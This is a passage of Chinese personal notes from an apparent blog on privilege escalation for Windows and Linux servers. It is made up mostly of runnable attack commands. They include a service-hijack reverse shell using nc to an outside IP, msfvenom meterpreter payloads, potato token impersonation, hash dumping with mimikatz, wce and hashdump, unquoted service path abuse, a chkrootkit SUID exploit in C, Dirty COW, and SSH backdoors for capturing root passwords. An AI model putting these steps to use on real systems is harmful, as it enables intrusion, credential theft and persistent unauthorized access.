+poc.exe “getpass.exe” 获取<hanla></hanla>hash
+
+pr<hanla></hanla>巴西烤肉就是溢出提权
+KB956572 MS09-012
+</code></pre>
+<h3 id="windows低权限进程劫持提权"><a href="#windows低权限进程劫持提权" class="headerlink" title="windows低权限进程劫持提权"></a><hanla></hanla>windows<hanla></hanla>低权限进程劫持提权</h3><pre><code><hanla></hanla>accessckh administrators -c *
+查看用户组下所有服务
+access ckh users -c *
+accesschk.exe -uwcqv "users"  *      查看<hanla></hanla>user<hanla></hanla>组可读写的服务
+net start | find "服务名称"    查看指定的服务名称有没有启动  
+sc qc kdc      查看服务信息，kdc<hanla></hanla>为服务名称  ，通过查看服务信息获取为系统权限的服务进行修改。
+sc config kdc binpath= "c:\temp\nc.exe -nv 192.168..200 3344 -e cmd.exe"
+sc config kdc obj=".\LocalSystem" password=""
+net start kdc
+vps 上侦听<hanla></hanla>3344 端口即可
+会返回来一个<hanla></hanla>system<hanla></hanla>权限的<hanla></hanla>shell
+03<hanla></hanla>服务器可以
+</code></pre>
+<h3 id="漏洞提权总结"><a href="#漏洞提权总结" class="headerlink" title="漏洞提权总结"></a>漏洞提权总结</h3><pre><code><hanla></hanla>先提取未打补丁的漏洞编号
+找到该编号的漏洞利用程序
+注意：
+有时候找到的漏洞利用程序未必能执行成功
+如果不行
+多找几个版本来利用
+
+08<hanla></hanla>以下系统一般尝试
+ms18-8120
+JuicyPotato
+ms16-075.exe
+1.<hanla></hanla>服务器问题
+2.<hanla></hanla>程序本身问题
+
+03<hanla></hanla>以下的服务器  尽量找<hanla></hanla>pr  巴西烤肉  利用程序 成功率高  稳定
+08  建议<hanla></hanla>14<hanla></hanla>以后的<hanla></hanla>exp<hanla></hanla>进行利用  烂土豆  ms16-075  劫持<hanla></hanla>token  提权效果比较好
+2012
+2016
+2019
+找高版本的漏洞利用提权
+关注漏洞发布平台  src<hanla></hanla>应急平台
+</code></pre>
+<h2 id="利用msf提权"><a href="#利用msf提权" class="headerlink" title="利用msf提权"></a><hanla></hanla>利用<hanla></hanla>msf<hanla></hanla>提权</h2><p>搜索可以利用的漏洞模块<br><hanla></hanla>search ms10<br>search ms11<br>search ms12<br>search ms13<br>search ms14<br>search ms15<br>search ms16<br>search ms17  </p>
+<p>msf 提权<br><hanla></hanla>1.<hanla></hanla>生成<hanla></hanla>payload<br><hanla></hanla>2.<hanla></hanla>端口转发<br><hanla></hanla>3.<hanla></hanla>考虑有无<hanla></hanla>av(杀毒)<br><hanla></hanla>无提示反弹，  </p>
+<pre><code>msfvenome -p windows/meterpreter/reverse_tcp lhost=192.168.43.217 lport=1122 -f exe &gt; /root/ax.exe  
+</code></pre>
+<p>用菜刀把木马传上去</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwbDxt"><img src="https://s3.jpg.cm/2021/10/11/IwbDxt.png" alt="IwbDxt.png"></a></p>
+<p><hanla></hanla>msf<hanla></hanla>发现补丁缺失<br><hanla></hanla>use post/windows/gather/enum_patches<br>set session 1<br>run  </p>
+<p>use post/multi/recon/local_exploit_suggester<br>set session 2<br>exploit  </p>
+<p>发现确实的补丁后搜索利用<br><hanla></hanla>set session 7<br>show targets<br>set target 1<br>run  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwbO6R"><img src="https://s3.jpg.cm/2021/10/11/IwbO6R.png" alt="IwbO6R.png"></a></p>
+<p>msf 16-075 最好用  这个就是烂土豆，提权</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuUbL"><img src="https://s3.jpg.cm/2021/10/11/IwuUbL.png" alt="IwuUbL.png"></a></p>
+<h4 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h4><p><hanla></hanla>把<hanla></hanla>potato.exe<hanla></hanla>上传上去</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuA02"><img src="https://s3.jpg.cm/2021/10/11/IwuA02.png" alt="IwuA02.png"></a></p>
+<p><hanla></hanla>dir<hanla></hanla>看一下是否上传了上去</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwu8NW"><img src="https://s3.jpg.cm/2021/10/11/Iwu8NW.png" alt="Iwu8NW.png"></a></p>
+<p>use  incognito<br>list_tokens -u</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuV5S"><img src="https://s3.jpg.cm/2021/10/11/IwuV5S.png" alt="IwuV5S.png"></a></p>
+<p>execute -cH -f ./potato.exe<br>list_tokens  -u<br>impersonat_token ‘’NT AUTHORITY\SYSTEM”<br>getuid<br><hanla></hanla>这时候在看已经是<hanla></hanla>system<hanla></hanla>权限了  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwucLH"><img src="https://s3.jpg.cm/2021/10/11/IwucLH.png" alt="IwucLH.png"></a></p>
+<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a><hanla></hanla>绕过<hanla></hanla>UAC<hanla></hanla>提权</h2><p><hanla></hanla>绕过<hanla></hanla>uac（管理员以上权限才可以）<br>use exploit/windows/local/bypassuac<br><hanla></hanla>set session 3  #shell<hanla></hanla>回话的<hanla></hanla>id<br>run  </p>
+<p>use exploit/windows/local/ask<br>set session 3<br>run  </p>
+<h2 id="假冒令牌获取提权"><a href="#假冒令牌获取提权" class="headerlink" title="假冒令牌获取提权"></a>假冒令牌获取提权</h2><p><hanla></hanla>在拿到<hanla></hanla>shell<hanla></hanla>回话后执行：<br><hanla></hanla>meterpreter<hanla></hanla>下：<br>use incognito<br>list_tokens -u<br>Execute –cH –f ./potato.exe<br>list_tokens -u<br>impersonate_token “nt /system”<br>shell<br>whoami 查看是否是管理员权限  </p>
+<h2 id="抓取hash"><a href="#抓取hash" class="headerlink" title="抓取hash"></a><hanla></hanla>抓取<hanla></hanla>hash</h2><p><hanla></hanla>使用<hanla></hanla>hashdump 抓取密码<br><hanla></hanla>win7<hanla></hanla>一下系统可以直接抓取<hanla></hanla>hash,<hanla></hanla>以上因为开了<hanla></hanla>uac<hanla></hanla>不能直接抓取<br><hanla></hanla>hash<hanla></hanla>要绕过<hanla></hanla>uac<br>hashdump<br>run windows/gather/smart_hashdump  </p>
+<p>获取铭文密码<br><hanla></hanla>wce -w  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuH6O"><img src="https://s3.jpg.cm/2021/10/11/IwuH6O.png" alt="IwuH6O.png"></a></p>
+<p><hanla></hanla>vi  a.hash   把<hanla></hanla>hash<hanla></hanla>都写进去<br><hanla></hanla>john   a.hash  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwubof"><img src="https://s3.jpg.cm/2021/10/11/Iwubof.png" alt="Iwubof.png"></a></p>
+<h2 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a><hanla></hanla>使用<hanla></hanla>mimikatz</h2><p><hanla></hanla>必须管理员以上权限才能用<br><hanla></hanla>getuid  查看权限<br><hanla></hanla>getsystem 获取<hanla></hanla>system<hanla></hanla>权限<br><hanla></hanla>load mimikatz<br>help mimikatz<br><hanla></hanla>mimikatz_command -f a::   随便输入一个<hanla></hanla>a<hanla></hanla>模块让他报错会显示所有可用模块<br><hanla></hanla>mimikatz_command -f hash::  查看指定模块使用方法<br><hanla></hanla>msv 抓取系统<hanla></hanla>hash<hanla></hanla>值<br><hanla></hanla>kerberos 抓取系统票据<br><hanla></hanla>wdigest  获取系统账号信息<br><hanla></hanla>mimikatz_command -f samdump::hashes  抓取<hanla></hanla>hash<br>mimikatz_command -f handle::list   查看系统进程<br><hanla></hanla>mimikatz_command -f service::   查看系统服务、  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuuDU"><img src="https://s3.jpg.cm/2021/10/11/IwuuDU.png" alt="IwuuDU.png"></a></p>
+<p><hanla></hanla>破解<hanla></hanla>NTLM</p>
+<h2 id="Trusted-Service-Paths-提权"><a href="#Trusted-Service-Paths-提权" class="headerlink" title="Trusted Service Paths 提权"></a>Trusted Service Paths 提权</h2><pre><code><hanla></hanla>windows<hanla></hanla>服务通常都是以<hanla></hanla>System<hanla></hanla>权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。例如，有如下的文件路径:
+C:\Program Files\Some Folder\Service.exe
+对于上面文件路径中的每一个空格，windows<hanla></hanla>都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，windows<hanla></hanla>会依次尝试确定和执行下面的程序：
+C:\Program.exe
+C:\Program Files\Some.exe
+C:\Program Files\Some Folder\Service.exe
+所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，服务一旦重启，
+我们的恶意程序就会以<hanla></hanla>system<hanla></hanla>权限运行<hanla></hanla>(大多数情况下)。
+
+利用步骤
+1.<hanla></hanla>检测目标主机是否存在该漏洞
+wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr/i /v """
+如果存在以下结果则表示存在：
+FABS - Helping agent for MAGIX media database     Fabs    C:\Program Files (x86)\Common 
+Files\MAGIX Services\Database\bin\FABS.exe /DisableUI     Auto
+2.<hanla></hanla>检查对有漏洞目录是否有写入的权限。使用<hanla></hanla>Windows<hanla></hanla>内建工具<hanla></hanla>icacls<hanla></hanla>查看路径中受影响文件夹的权限
+(M)<hanla></hanla>代表修改权限，(F)<hanla></hanla>代表完全控制，(CI)<hanla></hanla>代表从属容器将继承访问控制项，(OI)<hanla></hanla>代表从属文件将继承访问控制项。
+
+
+3.<hanla></hanla>将我们需要执行的<hanla></hanla>exe<hanla></hanla>根据需要重命名并放置在可写入的有漏洞目录下，然后运行如下命令尝试重启服务，
+如果失败的话等待服务器重启时执行<hanla></hanla>exe，成功提权后记得清理痕迹。
+sc stop service_name
+sc start service_name
+假如我们的<hanla></hanla>exe<hanla></hanla>会弹回一个<hanla></hanla>SYSTEM<hanla></hanla>权限的<hanla></hanla>meterpreter shell
+或者
+msf：
+use exploit/windows/local/trusted_service_path
+set session 3
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.1
+set lport 1122
+run
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuJFw"><img src="https://s3.jpg.cm/2021/10/11/IwuJFw.png" alt="IwuJFw.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwuty8"><img src="https://s3.jpg.cm/2021/10/11/Iwuty8.png" alt="Iwuty8.png"></a></p>
+<h3 id="破解常见应用服务密码提权"><a href="#破解常见应用服务密码提权" class="headerlink" title="破解常见应用服务密码提权"></a>破解常见应用服务密码提权</h3><p><hanla></hanla>slqserver<br>mysql<br>ssh<br>telnet<br>rdp<br>vnc<br>radmin<br><hanla></hanla>注意：有时候得到的数据库等服务的密码有可能就是系统管理员密码<br>应注意获取各种的密码进行联想和系统密码的关联性。<br>我们放在内网渗透中讲解口令破解  </p>
+<h2 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h2><p>查看内核<br><hanla></hanla>uname -r<br><hanla></hanla>反弹<hanla></hanla>shell<hanla></hanla>执行命令<br><hanla></hanla>上传<hanla></hanla>exp<br><hanla></hanla>编译<br>执行<br>根据内核版本查找对应漏洞<br><hanla></hanla>收集<hanla></hanla>exp<br><hanla></hanla>可以从<a target="_blank" rel="noopener" href="http://www.exploit-db.com查找漏洞利用/"><hanla></hanla>www.exploit-db.com<hanla></hanla>查找漏洞利用</a>  </p>
+<p><hanla></hanla>linux<hanla></hanla>提权工具包里面，可以看内核版本找对应的<hanla></hanla>exp  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuB7u"><img src="https://s3.jpg.cm/2021/10/11/IwuB7u.png" alt="IwuB7u.png"></a></p>
+<p><hanla></hanla>把这个<hanla></hanla>a.c<hanla></hanla>拷贝过去<br><hanla></hanla>用<hanla></hanla>linux<hanla></hanla>提权打开一个<hanla></hanla>shell<hanla></hanla>反弹链接我</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuvVt"><img src="https://s3.jpg.cm/2021/10/11/IwuvVt.png" alt="IwuvVt.png"></a></p>
+<p>gcc a.c   编译<br><hanla></hanla>会生成一个<hanla></hanla>a.out<br>./a.out    运行<br><hanla></hanla>id   如果提取成功<hanla></hanla>id<hanla></hanla>会变成<hanla></hanla>0  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwuwkR"><img src="https://s3.jpg.cm/2021/10/11/IwuwkR.png" alt="IwuwkR.png"></a></p>
+<h3 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a><hanla></hanla>利用<hanla></hanla>SUID<hanla></hanla>提权</h3><p><hanla></hanla>寻找系统里可以用的<hanla></hanla>SUID<hanla></hanla>文件来提权<br><hanla></hanla>$ find / -perm -u=s -type f 2&gt;/dev/null  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwumDC"><img src="https://s3.jpg.cm/2021/10/11/IwumDC.png" alt="IwumDC.png"></a></p>
+<p><hanla></hanla>我们发现<hanla></hanla>nmap<hanla></hanla>居然有<hanla></hanla>SUID<hanla></hanla>标志位，来看看<hanla></hanla>nmap<hanla></hanla>版本<br><hanla></hanla>nmap<hanla></hanla>支持<hanla></hanla>“interactive.”<hanla></hanla>选项，用户能够通过该选项执行<hanla></hanla>shell<hanla></hanla>命令，通常，<br><hanla></hanla>安全人员会使用该命令来避免他们使用<hanla></hanla>nmap<hanla></hanla>命令被记录在<hanla></hanla>history<hanla></hanla>文件中  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwuk45"><img src="https://s3.jpg.cm/2021/10/11/Iwuk45.png" alt="Iwuk45.png"></a></p>
+<p><hanla></hanla>因为<hanla></hanla>nmap<hanla></hanla>有<hanla></hanla>SUID<hanla></hanla>位，所以通过<hanla></hanla>“!sh”<hanla></hanla>我们会获取到一个<hanla></hanla>root<hanla></hanla>权限的<hanla></hanla>shell</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwuoyz"><img src="https://s3.jpg.cm/2021/10/11/Iwuoyz.png" alt="Iwuoyz.png"></a></p>
+<h3 id="利用环境变量劫持高权限程序提权"><a href="#利用环境变量劫持高权限程序提权" class="headerlink" title="利用环境变量劫持高权限程序提权"></a>利用环境变量劫持高权限程序提权</h3><p>第一步：查找可操作文件<br><hanla></hanla>$ find / -perm -u=s -type f 2&gt;/dev/null<br><hanla></hanla>第二步：利用<hanla></hanla>file 命令查看文件是否可执行<br>执行该文件<br>在执行的时候可能会报错，根据报错来查看调用系统命令  </p>
+<h3 id="利用低权限用户目录下可被Root权限用户调用的脚本提权"><a href="#利用低权限用户目录下可被Root权限用户调用的脚本提权" class="headerlink" title="利用低权限用户目录下可被Root权限用户调用的脚本提权"></a><hanla></hanla>利用低权限用户目录下可被<hanla></hanla>Root<hanla></hanla>权限用户调用的脚本提权</h3><p><hanla></hanla>设置<hanla></hanla>bash<hanla></hanla>的<hanla></hanla>$path<hanla></hanla>环境变量<br><hanla></hanla>然而当我们调用<hanla></hanla>cat<hanla></hanla>命令的时候，cat<hanla></hanla>会从以上目录来寻找，如果我们添加.<hanla></hanla>到<hanla></hanla>$PATH<hanla></hanla>环境变量，<br><hanla></hanla>则会先从当前目录来寻找<hanla></hanla>cat<hanla></hanla>指令<br><hanla></hanla>新建<hanla></hanla>cat,<hanla></hanla>添加执行权限  </p>
+<p><hanla></hanla>这样当我们再次运行./msgmike<hanla></hanla>命令的时候，就会触发当前目录下的<hanla></hanla>cat(/bin/sh)  ，从而提权。完整的<hanla></hanla>exploit<hanla></hanla>如下</p>
+<p>啊啊啊搞不懂了，这里笔记随便做一下，以后在学  </p>
+<h3 id="利用chkrootkit-lt-0-49版本提权"><a href="#利用chkrootkit-lt-0-49版本提权" class="headerlink" title="利用chkrootkit <0.49版本提权"></a><hanla></hanla>利用<hanla></hanla>chkrootkit &lt;0.49<hanla></hanla>版本提权</h3><pre><code><hanla></hanla>1.<hanla></hanla>如果发现<hanla></hanla>Linux<hanla></hanla>服务器存在<hanla></hanla>chkrootkit<hanla></hanla>并且版本小于<hanla></hanla>0.49
+2.<hanla></hanla>上传一个利用脚本到<hanla></hanla>/tmp<hanla></hanla>目录下并编译
+#include <unistd.h>
+void main(void)
+{
+system("chown root:root /tmp/update");
+system("chmod 4755 /tmp/update");
+setuid(0);
+setgid(0);
+execl("/bin/sh","sh",NULL);
+}
+保存为<hanla></hanla>update.c
+进入到<hanla></hanla>/tmp<hanla></hanla>目录下
+gcc -o update  update.c
+
+然后等着管理员运行<hanla></hanla>chkrootkit<hanla></hanla>命令检测系统后门
+在发现<hanla></hanla>/tmp/update 所有者会变成<hanla></hanla>roo
+t
+这时候你在进入<hanla></hanla>/tmp<hanla></hanla>运行<hanla></hanla>update
+./update
+</unistd.h></code></pre>
+<h2 id="对linux-2-6-43的内核可以使用脏牛提权"><a href="#对linux-2-6-43的内核可以使用脏牛提权" class="headerlink" title="对linux 2.6.43的内核可以使用脏牛提权"></a><hanla></hanla>对<hanla></hanla>linux 2.6.43<hanla></hanla>的内核可以使用脏牛提权</h2><p><hanla></hanla>在<hanla></hanla>linux<hanla></hanla>提权工具包里面<hanla></hanla>dz.zip<br><hanla></hanla>提权成功可以 用<hanla></hanla>firefart 账号登录<hanla></hanla>cracer123</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwufSG"><img src="https://s3.jpg.cm/2021/10/11/IwufSG.png" alt="IwufSG.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwu0PX"><img src="https://s3.jpg.cm/2021/10/11/Iwu0PX.png" alt="Iwu0PX.png"></a></p>
+<p><hanla></hanla>安装<hanla></hanla>ssh<hanla></hanla>后门<br>记录登录进来的账号密码<br>通过这台服务器登录其他服务器的账号密码<br><hanla></hanla>留一个<hanla></hanla>root<hanla></hanla>密码后门  </p>
+<h3 id="键盘记录劫持root密码"><a href="#键盘记录劫持root密码" class="headerlink" title="键盘记录劫持root密码"></a><hanla></hanla>键盘记录劫持<hanla></hanla>root<hanla></hanla>密码</h3><p><hanla></hanla>fakesu</p>
+<p>fakels</p>
+<h3 id="破解ssh-root密码"><a href="#破解ssh-root密码" class="headerlink" title="破解ssh  root密码"></a><hanla></hanla>破解<hanla></hanla>ssh  root<hanla></hanla>密码</h3><p><hanla></hanla>hydra<br>msf</p>
+<h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>内网主机输入命令<br><hanla></hanla>lcx.exe -slave 外网<hanla></hanla>ip 外网端口  内网<hanla></hanla>ip   内网端口<br><hanla></hanla>lcx.exe -slave 200.1.1.1  1111    192.168.1.2  3389</p>
+<p>外网主机输入命令<br><hanla></hanla>lcx.exe  -listen 1111  1311</p>
+<h3 id="msf端口转发"><a href="#msf端口转发" class="headerlink" title="msf端口转发"></a><hanla></hanla>msf<hanla></hanla>端口转发</h3><p><a target="_blank" rel="noopener" href="https://www.ngrok.cc/"><hanla></hanla>https://www.ngrok.cc/</a><br><hanla></hanla>注册账号<br>启动转发<br><hanla></hanla>./sunny clientid 隧道<hanla></hanla>id  </p>
+<p><hanla></hanla>生成的木马连接地址写<hanla></hanla>ngrok<hanla></hanla>外部地址<br><hanla></hanla>msf<hanla></hanla>侦听还是本地地址和转发过来的本地端口即可  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwug24"><img src="https://s3.jpg.cm/2021/10/11/Iwug24.png" alt="Iwug24.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwu2bD"><img src="https://s3.jpg.cm/2021/10/11/Iwu2bD.png" alt="Iwu2bD.png"></a></p>
+<h3 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a><hanla></hanla>开启<hanla></hanla>3389</h3><p><hanla></hanla>使用<br><hanla></hanla>批处理文件开<hanla></hanla>3389<br><hanla></hanla>使用<hanla></hanla>sql<hanla></hanla>语句开<hanla></hanla>3389<br><hanla></hanla>使用<hanla></hanla>exe<hanla></hanla>开<hanla></hanla>3389<br><hanla></hanla>使用<hanla></hanla>vb<hanla></hanla>开<hanla></hanla>3389</p>
+<h3 id="一些命令利用"><a href="#一些命令利用" class="headerlink" title="一些命令利用"></a>一些命令利用</h3><p><hanla></hanla>type E:\wwwroot\Web.config  查看文件内容  </p>
+<p><hanla></hanla>cacls<hanla></hanla>命令<br><hanla></hanla>/T：更改当前目录及其所有子目录中指定文件的<hanla></hanla>ACL<br><hanla></hanla>/E：编辑<hanla></hanla>ACL<hanla></hanla>而不替换<br><hanla></hanla>/C：在出现拒绝访问错误时继续 　  　<br><hanla></hanla>/G   Userer:perm：赋予指定用户访问权限，Perm<hanla></hanla>代表不同级别的访问权限，其值可以是<hanla></hanla>R(读取)、W(写入)、C(更改，写入)、F(完全控制)<hanla></hanla>等  。<br><hanla></hanla>/R user：撤销指定用户的访问权限，注意该参数仅在与<hanla></hanla>“/E”<hanla></hanla>一起使用时有效。<br>cacls C:\wwwroot\1.htm /t /e /c /g interactive:f  </p>
+<p>要修改一个文件的权限的必要条件:<br><hanla></hanla>要有<hanla></hanla>USERS<hanla></hanla>组的完全控制权限<br><hanla></hanla>CMD<hanla></hanla>权限   </p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
